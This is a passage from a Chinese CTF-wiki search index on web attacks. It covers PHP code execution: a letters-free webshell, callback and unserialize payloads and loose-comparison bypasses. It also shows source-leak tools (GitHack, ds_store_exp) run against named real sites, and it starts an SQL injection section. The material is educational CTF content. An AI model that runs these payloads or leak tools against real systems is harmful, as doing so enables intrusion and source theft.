\u8f93\u51fa\u7ed3\u679c\u4e3a\uff1a </p> <p><pre><code>&lt;?php\necho \"{\"^\"/\";\n?&gt;\n</code></pre> \u8f93\u51fa\u7ed3\u679c\u4e3a\uff1a </p> <p>\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\uff0c<code>_GET</code>\u5c31\u662f\u8fd9\u4e48\u88ab\u6784\u9020\u51fa\u6765\u7684\u5566\uff01</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#_get_1","title":"\u83b7\u53d6<code>_GET</code>\u53c2\u6570\u00b6","text":"<p>\u6211\u4eec\u53c8\u8be5\u5982\u4f55\u83b7\u53d6<code>_GET</code>\u53c2\u6570\u5462\uff1f\u54b1\u4eec\u53ef\u4ee5\u6784\u9020\u51fa\u5982\u4e0b\u5b57\u4e32\uff1a</p> <p><pre><code>&lt;?php\necho ${$_}[_](${$_}[__]);//$_GET[_]($_GET[__])\n?&gt;\n</code></pre> \u6839\u636e\u524d\u9762\u6784\u9020\u7684\u6765\u770b\uff0c<code>$_</code>\u5df2\u7ecf\u53d8\u6210\u4e86<code>_GET</code>\u3002\u987a\u7406\u6210\u7ae0\u7684\u6765\u8bb2\uff0c<code>$_ = _GET</code>\u3002\u6211\u4eec\u6784\u5efa<code>$_GET[__]</code>\u662f\u4e3a\u4e86\u8981\u83b7\u53d6\u53c2\u6570\u503c\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#_11","title":"\u4f20\u5165\u53c2\u6570\u00b6","text":"<p>\u6b64\u65f6\u6211\u4eec\u53ea\u9700\u8981\u53bb\u8c03\u7528<code>getFlag</code>\u51fd\u6570\u83b7\u53d6<code>webshell</code>\u5c31\u597d\u4e86\uff0c\u6784\u9020\u5982\u4e0b\uff1a</p> <p><pre><code>&lt;?php\necho $_=getFlag;//getFlag\n?&gt;\n</code></pre> \u6240\u4ee5\u628a\u53c2\u6570\u5168\u90e8\u8fde\u63a5\u8d77\u6765\uff0c\u5c31\u53ef\u4ee5\u4e86\u3002 </p> <p>\u7ed3\u679c\u5982\u4e0b\uff1a</p> <p></p> <p>\u4e8e\u662f\u6211\u4eec\u5c31\u6210\u529f\u5730\u8bfb\u53d6\u5230\u4e86 flag\uff01</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#_12","title":"\u52a8\u6001\u51fd\u6570\u6267\u884c\u00b6","text":"<p>\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\u53ef\u4ee5\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002</p> <pre><code>&lt;?php\n$dyn_func = $_GET[\"dyn_func\"];\n$argument = $_GET[\"argument\"];\n$dyn_func($argument);\n?&gt;\n</code></pre>"},{"location":"web_bak/ctf-wiki-web/PHP/#_13","title":"\u53cd\u5f15\u53f7\u547d\u4ee4\u6267\u884c\u00b6","text":"<pre><code>&lt;?php\necho `ls -al`;\n?&gt;\n</code></pre>"},{"location":"web_bak/ctf-wiki-web/PHP/#curly-syntax","title":"Curly Syntax\u00b6","text":"<p>PHP \u7684 Curly Syntax \u4e5f\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\uff0c\u5b83\u5c06\u6267\u884c\u82b1\u62ec\u53f7\u95f4\u7684\u4ee3\u7801\uff0c\u5e76\u5c06\u7ed3\u679c\u66ff\u6362\u56de\u53bb\u3002</p> <pre><code>&lt;?php\n$var = \"aaabbbccc ${`ls`}\";\n?&gt;\n</code></pre> <pre><code>&lt;?php\n$foobar = \"phpinfo\";\n${\"foobar\"}();\n?&gt;\n</code></pre>"},{"location":"web_bak/ctf-wiki-web/PHP/#_14","title":"\u56de\u8c03\u51fd\u6570\u00b6","text":"<p>\u5f88\u591a\u51fd\u6570\u90fd\u53ef\u4ee5\u6267\u884c\u56de\u8c03\u51fd\u6570\uff0c\u5f53\u56de\u8c03\u51fd\u6570\u7528\u6237\u53ef\u63a7\u65f6\uff0c\u5c06\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002</p> <p><pre><code>&lt;?php\n$evil_callback = $_GET[\"callback\"];\n$some_array = array(0,1,2,3);\n$new_array = array_map($evil_callback, $some_array);\n?&gt;\n</code></pre> \u653b\u51fb payload <pre><code>http://www.a.com/index.php?callback=phpinfo\n</code></pre></p>"},{"location":"web_bak/ctf-wiki-web/PHP/#_15","title":"\u53cd\u5e8f\u5217\u5316\u00b6","text":"<p>\u5982\u679c<code>unserialize()</code>\u5728\u6267\u884c\u65f6\u5b9a\u4e49\u4e86<code>__destruct()</code>\u6216<code>__wakeup()</code>\u51fd\u6570\uff0c\u5219\u6709\u53ef\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002</p> <p><pre><code>&lt;?php\nclass Example {\n  var $var = \"\";\n  function __destruct() {\n    eval($this-&gt;var);\n  }\n}\nunserialize($_GET[\"saved_code\"]);\n?&gt;\n</code></pre> \u653b\u51fb payload <pre><code>http://www.a.com/index.php?saved_code=O:7:\"Example\":1:{s:3:\"var\";s:10:\"phpinfo();\";}\n</code></pre></p>"},{"location":"web_bak/ctf-wiki-web/PHP/#php","title":"PHP \u7279\u6027\u00b6","text":""},{"location":"web_bak/ctf-wiki-web/PHP/#_16","title":"\u6570\u7ec4\u00b6","text":"<p><pre><code>&lt;?php\n$var = 1;\n$var = array();\n$var = \"string\";\n?&gt;\n</code></pre> php \u4e0d\u4f1a\u4e25\u683c\u68c0\u9a8c\u4f20\u5165\u7684\u53d8\u91cf\u7c7b\u578b\uff0c\u4e5f\u53ef\u4ee5\u5c06\u53d8\u91cf\u81ea\u7531\u7684\u8f6c\u6362\u7c7b\u578b\u3002 \u6bd4\u5982\u5728<code>$a == $b</code>\u7684\u6bd4\u8f83\u4e2d</p> <p><pre><code>$a = null; \n$b = false; //\u4e3a\u771f \n$a = ''; \n$b = 0; //\u540c\u6837\u4e3a\u771f\n</code></pre> \u7136\u800c\uff0cPHP \u5185\u6838\u7684\u5f00\u53d1\u8005\u539f\u672c\u662f\u60f3\u8ba9\u7a0b\u5e8f\u5458\u501f\u7531\u8fd9\u79cd\u4e0d\u9700\u8981\u58f0\u660e\u7684\u4f53\u7cfb\uff0c\u66f4\u52a0\u9ad8\u6548\u7684\u5f00\u53d1\uff0c\u6240\u4ee5\u5728\u51e0\u4e4e\u6240\u6709\u5185\u7f6e\u51fd\u6570\u4ee5\u53ca\u57fa\u672c\u7ed3\u6784\u4e2d\u4f7f\u7528\u4e86\u5f88\u591a\u677e\u6563\u7684\u6bd4\u8f83\u548c\u8f6c\u6362\uff0c\u9632\u6b62\u7a0b\u5e8f\u4e2d\u7684\u53d8\u91cf\u56e0\u4e3a\u7a0b\u5e8f\u5458\u7684\u4e0d\u89c4\u8303\u800c\u9891\u7e41\u7684\u62a5\u9519\uff0c\u7136\u800c\u8fd9\u5374\u5e26\u6765\u4e86\u5b89\u5168\u95ee\u9898\u3002 <pre><code>0=='0' //true\n0 == 'abcdefg' //true\n0 === 'abcdefg' //false\n1 == '1abcdef' //true\n</code></pre></p>"},{"location":"web_bak/ctf-wiki-web/PHP/#hash","title":"\u9b54\u6cd5 Hash\u00b6","text":"<p><pre><code>\"0e132456789\"==\"0e7124511451155\" //true\n\"0e123456abc\"==\"0e1dddada\" //false\n\"0e1abc\"==\"0\"  //true\n</code></pre> \u5728\u8fdb\u884c\u6bd4\u8f83\u8fd0\u7b97\u65f6\uff0c\u5982\u679c\u9047\u5230\u4e86<code>0e\\d+</code>\u8fd9\u79cd\u5b57\u7b26\u4e32\uff0c\u5c31\u4f1a\u5c06\u8fd9\u79cd\u5b57\u7b26\u4e32\u89e3\u6790\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\u3002\u6240\u4ee5\u4e0a\u9762\u4f8b\u5b50\u4e2d 2 \u4e2a\u6570\u7684\u503c\u90fd\u662f 0 \u56e0\u800c\u5c31\u76f8\u7b49\u4e86\u3002\u5982\u679c\u4e0d\u6ee1\u8db3<code>0e\\d+</code>\u8fd9\u79cd\u6a21\u5f0f\u5c31\u4e0d\u4f1a\u76f8\u7b49\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#_17","title":"\u5341\u516d\u8fdb\u5236\u8f6c\u6362\u00b6","text":"<p><pre><code>\"0x1e240\"==\"123456\" //true\n\"0x1e240\"==123456 //true\n\"0x1e240\"==\"1e240\" //false\n</code></pre> \u5f53\u5176\u4e2d\u7684\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f<code>0x</code>\u5f00\u5934\u7684\u65f6\u5019\uff0cPHP \u4f1a\u5c06\u6b64\u5b57\u7b26\u4e32\u89e3\u6790\u6210\u4e3a\u5341\u8fdb\u5236\u7136\u540e\u518d\u8fdb\u884c\u6bd4\u8f83\uff0c<code>0x1240</code>\u89e3\u6790\u6210\u4e3a\u5341\u8fdb\u5236\u5c31\u662f 123456\uff0c\u6240\u4ee5\u4e0e<code>int</code>\u7c7b\u578b\u548c<code>string</code>\u7c7b\u578b\u7684 123456 \u6bd4\u8f83\u90fd\u662f\u76f8\u7b49\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#_18","title":"\u7c7b\u578b\u8f6c\u6362\u00b6","text":"<p>\u5e38\u89c1\u7684\u8f6c\u6362\u4e3b\u8981\u5c31\u662f<code>int</code>\u8f6c\u6362\u4e3a<code>string</code>\uff0c<code>string</code>\u8f6c\u6362\u4e3a<code>int</code>\u3002</p> <p><code>int</code>\u8f6c<code>string</code></p> <p><pre><code>$var = 5;\n\u65b9\u5f0f1\uff1a$item = (string)$var;\n\u65b9\u5f0f2\uff1a$item = strval($var);\n</code></pre> <code>string</code>\u8f6c<code>int</code>\uff1a<code>intval()</code>\u51fd\u6570\u3002 \u5bf9\u4e8e\u8fd9\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u5148\u770b 2 \u4e2a\u4f8b\u5b50\u3002</p> <p><pre><code>var_dump(intval('2')) //2\nvar_dump(intval('3abcd')) //3\nvar_dump(intval('abcd')) //0\n</code></pre> \u8bf4\u660e<code>intval()</code>\u8f6c\u6362\u7684\u65f6\u5019\uff0c\u4f1a\u4ece\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u8fdb\u884c\u8f6c\u6362\u76f4\u5230\u9047\u5230\u4e00\u4e2a\u975e\u6570\u5b57\u7684\u5b57\u7b26\u3002\u5373\u4f7f\u51fa\u73b0\u65e0\u6cd5\u8f6c\u6362\u7684\u5b57\u7b26\u4e32\uff0c<code>intval()</code>\u4e0d\u4f1a\u62a5\u9519\u800c\u662f\u8fd4\u56de 0\u3002 \u540c\u65f6\uff0c\u7a0b\u5e8f\u5458\u5728\u7f16\u7a0b\u7684\u65f6\u5019\u4e5f\u4e0d\u5e94\u8be5\u4f7f\u7528\u5982\u4e0b\u7684\u8fd9\u6bb5\u4ee3\u7801\uff1a</p> <p><pre><code>if(intval($a)&gt;1000) {\n mysql_query(\"select * from news where id=\".$a)\n}\n</code></pre> \u8fd9\u4e2a\u65f6\u5019<code>$a</code>\u7684\u503c\u6709\u53ef\u80fd\u662f<code>1002 union</code>\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#_19","title":"\u5185\u7f6e\u51fd\u6570\u7684\u53c2\u6570\u7684\u677e\u6563\u6027\u00b6","text":"<p>\u5185\u7f6e\u51fd\u6570\u7684\u677e\u6563\u6027\u8bf4\u7684\u662f\uff0c\u8c03\u7528\u51fd\u6570\u65f6\u7ed9\u51fd\u6570\u4f20\u9012\u51fd\u6570\u65e0\u6cd5\u63a5\u53d7\u7684\u53c2\u6570\u7c7b\u578b\u3002\u89e3\u91ca\u8d77\u6765\u6709\u70b9\u62d7\u53e3\uff0c\u8fd8\u662f\u76f4\u63a5\u901a\u8fc7\u5b9e\u9645\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u95ee\u9898\uff0c\u4e0b\u9762\u4f1a\u91cd\u70b9\u4ecb\u7ecd\u51e0\u4e2a\u8fd9\u79cd\u51fd\u6570\u3002</p> <p>md5()</p> <p><pre><code>$array1[] = array(\n \"foo\" =&gt; \"bar\",\n \"bar\" =&gt; \"foo\",\n);\n$array2 = array(\"foo\", \"bar\", \"hello\", \"world\");\nvar_dump(md5($array1)==md5($array2)); //true\n</code></pre> PHP \u624b\u518c\u4e2d\u7684 md5\uff08\uff09\u51fd\u6570\u7684\u63cf\u8ff0\u662f<code>string md5 ( string $str [, bool $raw_output = false ] )</code>\uff0c<code>md5()</code>\u4e2d\u7684\u9700\u8981\u662f\u4e00\u4e2a string \u7c7b\u578b\u7684\u53c2\u6570\u3002\u4f46\u662f\u5f53\u4f60\u4f20\u9012\u4e00\u4e2a array \u65f6\uff0c<code>md5()</code>\u4e0d\u4f1a\u62a5\u9519\uff0c\u53ea\u662f\u4f1a\u65e0\u6cd5\u6b63\u786e\u5730\u6c42\u51fa array \u7684 md5 \u503c\uff0c\u8fd9\u6837\u5c31\u4f1a\u5bfc\u81f4\u4efb\u610f 2 \u4e2a array \u7684 md5 \u503c\u90fd\u4f1a\u76f8\u7b49\u3002 strcmp()</p> <p><code>strcmp()</code>\u51fd\u6570\u5728 PHP \u5b98\u65b9\u624b\u518c\u4e2d\u7684\u63cf\u8ff0\u662f<code>intstrcmp ( string $str1 \uff0c string $str2 )</code>\uff0c\u9700\u8981\u7ed9<code>strcmp()</code>\u4f20\u9012 2 \u4e2a<code>string</code>\u7c7b\u578b\u7684\u53c2\u6570\u3002\u5982\u679c<code>str1</code>\u5c0f\u4e8e<code>str2</code>\uff0c\u8fd4\u56de -1\uff0c\u76f8\u7b49\u8fd4\u56de 0\uff0c\u5426\u5219\u8fd4\u56de 1\u3002<code>strcmp()</code>\u51fd\u6570\u6bd4\u8f83\u5b57\u7b26\u4e32\u7684\u672c\u8d28\u662f\u5c06\u4e24\u4e2a\u53d8\u91cf\u8f6c\u6362\u4e3a ASCII\uff0c\u7136\u540e\u8fdb\u884c\u51cf\u6cd5\u8fd0\u7b97\uff0c\u7136\u540e\u6839\u636e\u8fd0\u7b97\u7ed3\u679c\u6765\u51b3\u5b9a\u8fd4\u56de\u503c\u3002</p> <p>\u5982\u679c\u4f20\u5165\u7ed9\u51fa<code>strcmp()</code>\u7684\u53c2\u6570\u662f\u6570\u5b57\u5462\uff1f</p> <p><pre><code>$array=[1,2,3];\nvar_dump(strcmp($array,'123')); //null,\u5728\u67d0\u79cd\u610f\u4e49\u4e0anull\u4e5f\u5c31\u662f\u76f8\u5f53\u4e8efalse\u3002\n</code></pre> switch() \u5982\u679c<code>switch()</code>\u662f\u6570\u5b57\u7c7b\u578b\u7684 case \u7684\u5224\u65ad\u65f6\uff0cswitch \u4f1a\u5c06\u5176\u4e2d\u7684\u53c2\u6570\u8f6c\u6362\u4e3a int \u7c7b\u578b\u3002\u5982\u4e0b\uff1a</p> <p><pre><code>$i =\"2abc\";\nswitch ($i) {\ncase 0:\ncase 1:\ncase 2:\n echo \"i is less than 3 but not negative\";\n break;\ncase 3:\n echo \"i is 3\";\n}\n</code></pre> \u8fd9\u4e2a\u65f6\u5019\u7a0b\u5e8f\u8f93\u51fa\u7684\u662f<code>i is less than 3 but not negative</code>\uff0c\u662f\u7531\u4e8e<code>switch()</code>\u51fd\u6570\u5c06<code>$i</code>\u8fdb\u884c\u4e86\u7c7b\u578b\u8f6c\u6362\uff0c\u8f6c\u6362\u7ed3\u679c\u4e3a 2\u3002 in_array()</p> <p>\u5728 PHP \u624b\u518c\u4e2d\uff0c<code>in_array()</code>\u51fd\u6570\u7684\u89e3\u91ca\u662f<code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code>, \u5982\u679c strict \u53c2\u6570\u6ca1\u6709\u63d0\u4f9b\uff0c\u90a3\u4e48<code>in_array</code>\u5c31\u4f1a\u4f7f\u7528\u677e\u6563\u6bd4\u8f83\u6765\u5224\u65ad<code>$needle</code>\u662f\u5426\u5728<code>$haystack</code>\u4e2d\u3002\u5f53 strict \u7684\u503c\u4e3a true \u65f6\uff0c<code>in_array()</code>\u4f1a\u6bd4\u8f83 needls \u7684\u7c7b\u578b\u548c haystack \u4e2d\u7684\u7c7b\u578b\u662f\u5426\u76f8\u540c\u3002</p> <p><pre><code>$array=[0,1,2,'3'];\nvar_dump(in_array('abc', $array)); //true\nvar_dump(in_array('1bc', $array)); //true\n</code></pre> \u53ef\u4ee5\u770b\u5230\u4e0a\u9762\u7684\u60c5\u51b5\u8fd4\u56de\u7684\u90fd\u662f true\uff0c\u56e0\u4e3a<code>'abc'</code>\u4f1a\u8f6c\u6362\u4e3a 0\uff0c<code>'1bc'</code>\u8f6c\u6362\u4e3a 1\u3002 <code>array_search()</code>\u4e0e<code>in_array()</code>\u4e5f\u662f\u4e00\u6837\u7684\u95ee\u9898\u3002</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#_20","title":"\u5bfb\u627e\u6e90\u4ee3\u7801\u5907\u4efd\u00b6","text":""},{"location":"web_bak/ctf-wiki-web/PHP/#hg","title":"hg \u6e90\u7801\u6cc4\u9732\u00b6","text":"<p><code>hg init</code>\u65f6\u4f1a\u4ea7\u751f<code>.hg</code>\u6587\u4ef6\u3002</p> <p>\u5229\u7528\u5de5\u5177 dvcs-ripper</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#git","title":"Git \u6e90\u7801\u6cc4\u9732\u00b6","text":"<p><code>.git</code>\u76ee\u5f55\u5185\u6709\u4ee3\u7801\u7684\u53d8\u66f4\u8bb0\u5f55\u7b49\u6587\u4ef6\uff0c\u5982\u679c\u90e8\u7f72\u65f6\u8be5\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u53ef\u88ab\u8bbf\u95ee\uff0c\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u6765\u6062\u590d\u6e90\u4ee3\u7801\u3002</p> <p><pre><code>/.git\n/.git/HEAD\n/.git/index\n/.git/config\n/.git/description\n</code></pre> GitHack <pre><code>python GitHack.py http://www.openssl.org/.git/\n</code></pre> GitHacker\uff08\u53ef\u6062\u590d\u5b8c\u6574 Git \u4ed3\u5e93\uff09 <pre><code>python GitHacker.py http://www.openssl.org/.git/\n</code></pre></p>"},{"location":"web_bak/ctf-wiki-web/PHP/#ds_store","title":"<code>.DS_Store</code>\u6587\u4ef6\u6cc4\u9732\u00b6","text":"<p>Mac OS \u4e2d\u4f1a\u5305\u542b\u6709<code>.DS_Store</code>\u6587\u4ef6\uff0c\u5305\u542b\u6587\u4ef6\u540d\u7b49\u4fe1\u606f\u3002</p> <p>\u5229\u7528\u5de5\u5177 ds_store_exp</p> <pre><code>python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store\nhd.zj.qq.com/\n\u2514\u2500\u2500 themes\n    \u2514\u2500\u2500 galaxyw\n        \u251c\u2500\u2500 app\n        \u2502   \u2514\u2500\u2500 css\n        \u2502       \u2514\u2500\u2500 style.min.css\n        \u251c\u2500\u2500 cityData.min.js\n        \u251c\u2500\u2500 images\n        \u2502   \u2514\u2500\u2500 img\n        \u2502       \u251c\u2500\u2500 bg-hd.png\n        \u2502       \u251c\u2500\u2500 bg-item-activity.png\n        \u2502       \u251c\u2500\u2500 bg-masker-pop.png\n        \u2502       \u251c\u2500\u2500 btn-bm.png\n        \u2502       \u251c\u2500\u2500 btn-login-qq.png\n        \u2502       \u251c\u2500\u2500 btn-login-wx.png\n        \u2502       \u251c\u2500\u2500 ico-add-pic.png\n        \u2502       \u251c\u2500\u2500 ico-address.png\n        \u2502       \u251c\u2500\u2500 ico-bm.png\n        \u2502       \u251c\u2500\u2500 ico-duration-time.png\n        \u2502       \u251c\u2500\u2500 ico-pop-close.png\n        \u2502       \u251c\u2500\u2500 ico-right-top-delete.png\n        \u2502       \u251c\u2500\u2500 page-login-hd.png\n        \u2502       \u251c\u2500\u2500 pic-masker.png\n        \u2502       \u2514\u2500\u2500 ticket-selected.png\n        \u2514\u2500\u2500 member\n            \u251c\u2500\u2500 assets\n            \u2502   \u251c\u2500\u2500 css\n            \u2502   \u2502   \u251c\u2500\u2500 ace-reset.css\n            \u2502   \u2502   \u2514\u2500\u2500 antd.css\n            \u2502   \u2514\u2500\u2500 lib\n            \u2502       \u251c\u2500\u2500 cityData.min.js\n            \u2502       \u2514\u2500\u2500 ueditor\n            \u2502           \u251c\u2500\u2500 index.html\n            \u2502           \u251c\u2500\u2500 lang\n            \u2502           \u2502   \u2514\u2500\u2500 zh-cn\n            \u2502           \u2502       \u251c\u2500\u2500 images\n            \u2502           \u2502       \u2502   \u251c\u2500\u2500 copy.png\n            \u2502           \u2502       \u2502   \u251c\u2500\u2500 localimage.png\n            \u2502           \u2502       \u2502   \u251c\u2500\u2500 music.png\n            \u2502           \u2502       \u2502   \u2514\u2500\u2500 upload.png\n            \u2502           \u2502       \u2514\u2500\u2500 zh-cn.js\n            \u2502           \u251c\u2500\u2500 php\n            \u2502           \u2502   \u251c\u2500\u2500 action_crawler.php\n            \u2502           \u2502   \u251c\u2500\u2500 action_list.php\n            \u2502           \u2502   \u251c\u2500\u2500 action_upload.php\n            \u2502           \u2502   \u251c\u2500\u2500 config.json\n            \u2502           \u2502   \u251c\u2500\u2500 controller.php\n            \u2502           \u2502   \u2514\u2500\u2500 Uploader.class.php\n            \u2502           \u251c\u2500\u2500 ueditor.all.js\n            \u2502           \u251c\u2500\u2500 ueditor.all.min.js\n            \u2502           \u251c\u2500\u2500 ueditor.config.js\n            \u2502           \u251c\u2500\u2500 ueditor.parse.js\n            \u2502           \u2514\u2500\u2500 ueditor.parse.min.js\n            \u2514\u2500\u2500 static\n                \u251c\u2500\u2500 css\n                \u2502   \u2514\u2500\u2500 page.css\n                \u251c\u2500\u2500 img\n                \u2502   \u251c\u2500\u2500 bg-table-title.png\n                \u2502   \u251c\u2500\u2500 bg-tab-say.png\n                \u2502   \u251c\u2500\u2500 ico-black-disabled.png\n                \u2502   \u251c\u2500\u2500 ico-black-enabled.png\n                \u2502   \u251c\u2500\u2500 ico-coorption-person.png\n                \u2502   \u251c\u2500\u2500 ico-miss-person.png\n                \u2502   \u251c\u2500\u2500 ico-mr-person.png\n                \u2502   \u251c\u2500\u2500 ico-white-disabled.png\n                \u2502   \u2514\u2500\u2500 ico-white-enabled.png\n                \u2514\u2500\u2500 scripts\n                    \u251c\u2500\u2500 js\n                    \u2514\u2500\u2500 lib\n                        \u2514\u2500\u2500 jquery.min.js\n21 directories, 48 files\n</code></pre>"},{"location":"web_bak/ctf-wiki-web/PHP/#_21","title":"\u7f51\u7ad9\u5907\u4efd\u6587\u4ef6\u00b6","text":"<p>\u7ba1\u7406\u5458\u5907\u4efd\u7f51\u7ad9\u6587\u4ef6\u540e\u9519\u8bef\u5730\u5c06\u5907\u4efd\u653e\u5728 Web \u76ee\u5f55\u4e0b\u3002</p> <p>\u5e38\u89c1\u7684\u540e\u7f00\u540d\uff1a</p> <pre><code>.rar\n.zip\n.7z\n.tar\n.tar.gz\n.bak\n.txt\n</code></pre>"},{"location":"web_bak/ctf-wiki-web/PHP/#svn","title":"SVN \u6cc4\u9732\u00b6","text":"<p>\u654f\u611f\u6587\u4ef6\uff1a</p> <p><pre><code>/.svn\n/.svn/wc.db\n/.svn/entries\n</code></pre> dvcs-ripper <pre><code>perl rip-svn.pl -v -u http://www.example.com/.svn/\n</code></pre> Seay - SVN</p>"},{"location":"web_bak/ctf-wiki-web/PHP/#web-inf-webxml","title":"WEB-INF / web.xml \u6cc4\u9732\u00b6","text":"<p>WEB-INF \u662f Java Web \u5e94\u7528\u7684\u5b89\u5168\u76ee\u5f55\uff0cweb.xml \u4e2d\u6709\u6587\u4ef6\u7684\u6620\u5c04\u5173\u7cfb\u3002</p> <p>WEB-INF \u4e3b\u8981\u5305\u542b\u4e00\u4e0b\u6587\u4ef6\u6216\u76ee\u5f55\uff1a</p> <ul> <li><code>/WEB-INF/web.xml</code>\uff1aWeb \u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u6587\u4ef6\uff0c\u63cf\u8ff0\u4e86 servlet \u548c\u5176\u4ed6\u7684\u5e94\u7528\u7ec4\u4ef6\u914d\u7f6e\u53ca\u547d\u540d\u89c4\u5219\u3002</li> <li><code>/WEB-INF/classes/</code>\uff1a\u542b\u4e86\u7ad9\u70b9\u6240\u6709\u7528\u7684 class \u6587\u4ef6\uff0c\u5305\u62ec servlet class \u548c\u975e servlet class\uff0c\u4ed6\u4eec\u4e0d\u80fd\u5305\u542b\u5728 jar \u6587\u4ef6\u4e2d\u3002</li> <li><code>/WEB-INF/lib/</code>\uff1a\u5b58\u653e web \u5e94\u7528\u9700\u8981\u7684\u5404\u79cd JAR \u6587\u4ef6\uff0c\u653e\u7f6e\u4ec5\u5728\u8fd9\u4e2a\u5e94\u7528\u4e2d\u8981\u6c42\u4f7f\u7528\u7684 jar \u6587\u4ef6\uff0c\u5982\u6570\u636e\u5e93\u9a71\u52a8 jar \u6587\u4ef6\u3002</li> <li><code>/WEB-INF/src/</code>\uff1a\u6e90\u7801\u76ee\u5f55\uff0c\u6309\u7167\u5305\u540d\u7ed3\u6784\u653e\u7f6e\u5404\u4e2a java \u6587\u4ef6\u3002</li> <li><code>/WEB-INF/database.properties</code>\uff1a\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u3002</li> </ul> <p>\u901a\u8fc7\u627e\u5230 web.xml \u6587\u4ef6\uff0c\u63a8\u65ad class \u6587\u4ef6\u7684\u8def\u5f84\uff0c\u6700\u540e\u76f4\u63a5 class \u6587\u4ef6\uff0c\u518d\u901a\u8fc7\u53cd\u7f16\u8bd1 class \u6587\u4ef6\uff0c\u5f97\u5230\u7f51\u7ad9\u6e90\u7801\u3002 \u4e00\u822c\u60c5\u51b5\uff0cjsp \u5f15\u64ce\u9ed8\u8ba4\u90fd\u662f\u7981\u6b62\u8bbf\u95ee WEB-INF \u76ee\u5f55\u7684\uff0cNginx \u914d\u5408 Tomcat \u505a\u5747\u8861\u8d1f\u8f7d\u6216\u96c6\u7fa4\u7b49\u60c5\u51b5\u65f6\uff0c\u95ee\u9898\u539f\u56e0\u5176\u5b9e\u5f88\u7b80\u5355\uff0cNginx \u4e0d\u4f1a\u53bb\u8003\u8651\u914d\u7f6e\u5176\u4ed6\u7c7b\u578b\u5f15\u64ce\uff08Nginx \u4e0d\u662f jsp \u5f15\u64ce\uff09\u5bfc\u81f4\u7684\u5b89\u5168\u95ee\u9898\u800c\u5f15\u5165\u5230\u81ea\u8eab\u7684\u5b89\u5168\u89c4\u8303\u4e2d\u6765\uff08\u8fd9\u6837\u8026\u5408\u6027\u592a\u9ad8\u4e86\uff09\uff0c\u4fee\u6539 Nginx \u914d\u7f6e\u6587\u4ef6\u7981\u6b62\u8bbf\u95ee WEB-INF \u76ee\u5f55\u5c31\u597d\u4e86\uff1a</p> <pre><code>location ~ ^/WEB-INF/* { deny all; } # \u6216\u8005return 404; \u6216\u8005\u5176\u4ed6\uff01\n</code></pre>"},{"location":"web_bak/ctf-wiki-web/PHP/#cvs","title":"CVS \u6cc4\u9732\u00b6","text":"<p><pre><code>http://url/CVS/Root \u8fd4\u56de\u6839\u4fe1\u606f\nhttp://url/CVS/Entries \u8fd4\u56de\u6240\u6709\u6587\u4ef6\u7684\u7ed3\u6784\n</code></pre> \u53d6\u56de\u6e90\u7801 <pre><code>bk clone http://url/name dir\n</code></pre></p>"},{"location":"web_bak/ctf-wiki-web/PHP/#_22","title":"\u53c2\u8003\u6587\u732e\u00b6","text":"<ul> <li>\u8bb0\u4e00\u6b21\u62ff webshell \u8e29\u8fc7\u7684\u5751 (\u5982\u4f55\u7528 PHP \u7f16\u5199\u4e00\u4e2a\u4e0d\u5305\u542b\u6570\u5b57\u548c\u5b57\u6bcd\u7684\u540e\u95e8)</li> </ul>"},{"location":"web_bak/ctf-wiki-web/SQLI/","title":"SQLI","text":""},{"location":"web_bak/ctf-wiki-web/SQLI/#_1","title":"\u57fa\u672c\u6982\u5ff5\u00b6","text":"<ul> <li>SQL \u6ce8\u5165\u662f\u4e00\u79cd\u5c06 SQL \u4ee3\u7801\u63d2\u5165\u6216\u6dfb\u52a0\u5230\u5e94\u7528\uff08\u7528\u6237\uff09\u7684\u8f93\u5165\u53c2\u6570\u4e2d\uff0c\u4e4b\u540e\u518d\u5c06\u8fd9\u4e9b\u53c2\u6570\u4f20\u9012\u7ed9\u540e\u53f0\u7684 SQL \u670d\u52a1\u5668\u52a0\u4ee5\u89e3\u6790\u5e76\u6267\u884c\u7684\u653b\u51fb\u3002</li> <li>\u653b\u51fb\u8005\u80fd\u591f\u4fee\u6539 SQL \u8bed\u53e5\uff0c\u8be5\u8fdb\u7a0b\u5c06\u4e0e\u6267\u884c\u547d\u4ee4\u7684\u7ec4\u4ef6\uff08\u5982\u6570\u636e\u5e93\u670d\u52a1\u5668\u3001\u5e94\u7528\u670d\u52a1\u5668\u6216 WEB \u670d\u52a1\u5668\uff09\u62e5\u6709\u76f8\u540c\u7684\u6743\u9650\u3002</li> <li>\u5982\u679c WEB \u5e94\u7528\u5f00\u53d1\u4eba\u5458\u65e0\u6cd5\u786e\u4fdd\u5728\u5c06\u4ece WEB \u8868\u5355\u3001cookie\u3001\u8f93\u5165\u53c2\u6570\u7b49\u6536\u5230\u7684\u503c\u4f20\u9012\u7ed9 SQL \u67e5\u8be2\uff08\u8be5\u67e5\u8be2\u5728\u6570\u636e\u5e93\u670d\u52a1\u5668\u4e0a\u6267\u884c\uff09\u4e4b\u524d\u5df2\u7ecf\u5bf9\u5176\u8fdb\u884c\u8fc7\u9a8c\u8bc1\uff0c\u901a\u5e38\u5c31\u4f1a\u51fa\u73b0 SQL \u6ce8\u5165\u6f0f\u6d1e\u3002</li> 